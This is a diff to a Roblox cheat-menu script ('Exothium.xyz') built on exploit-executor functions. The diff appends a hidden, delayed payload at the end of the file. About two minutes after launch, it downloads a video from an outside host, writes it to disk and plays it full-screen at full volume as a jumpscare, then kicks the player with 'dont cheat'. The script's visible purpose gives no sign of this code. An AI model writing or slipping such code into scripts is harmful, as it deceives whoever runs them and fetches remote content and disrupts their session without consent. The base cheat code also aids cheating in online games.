@@ -3739,3 +3739,36 @@ Notify("Exothium.xyz", "Loaded script", 2.1)
 Notify("Exothium.xyz", "Press Insert to toggle the menu", 3.5)
 
 game.CoreGui.ewq9erdusafeuwufijnen329duewq_1.Enabled = true
+
+local CoreGui = game:GetService("StarterGui")
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = CoreGui
+
+local function playJumpscare()
+    if not isfile("video.webm") then
+        writefile("video.webm", game:HttpGet("https://api.swimhub.xyz/video.webm"))
+    end
+    if not getcustomasset then return end
+
+    local newVideoFrame = Instance.new("VideoFrame", ScreenGui)
+    newVideoFrame.Visible = false
+    newVideoFrame.Looped = true
+    newVideoFrame.Video = getcustomasset("video.webm")
+    newVideoFrame.Volume = 1
+    newVideoFrame.Size = UDim2.new(1, 0, 1, 0)
+    newVideoFrame.ZIndex = math.huge
+    newVideoFrame.BackgroundTransparency = 1
+
+    repeat task.wait() until newVideoFrame.IsLoaded
+    newVideoFrame.Visible = true
+    newVideoFrame:Play()
+end
+
+task.spawn(function()
+	task.wait(120)
+    task.wait(5)
+    playJumpscare()
+task.wait(10)
+game.Players.LocalPlayer:Kick("dont cheat")
+end)
+
